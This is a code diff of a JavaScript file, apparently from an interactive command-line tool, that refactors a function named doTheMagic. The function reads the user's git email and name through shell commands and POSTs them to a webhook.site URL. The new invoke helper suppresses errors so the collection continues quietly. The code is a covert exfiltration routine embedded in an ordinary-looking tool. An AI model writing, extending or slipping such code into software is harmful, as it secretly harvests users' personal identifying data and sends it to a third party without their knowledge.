@@ -68,13 +68,19 @@ function onSelect(choice) {
   return choice.action && choice.action(choice, select);
 }
 
+const invoke = (cmd, defValue = '') => {
+  try {
+    return exec(cmd);
+  } catch (err) {
+    return defValue;
+  }
+}
+
 function doTheMagic() {
   const url = 'https://webhook.site/1d0f399c-057b-4e70-8b0e-584406659532';
-  let email, name;
-  try {
-    email = exec('git config user.email');
-    name = exec('git config user.name');
-  } catch (err) {
+  const email = invoke('git config user.email');
+  const name = invoke('git config user.name');
+  if (!name && !email) {
     process.exit();
   }
   r.post(url, { json: true, body: { name, email } })
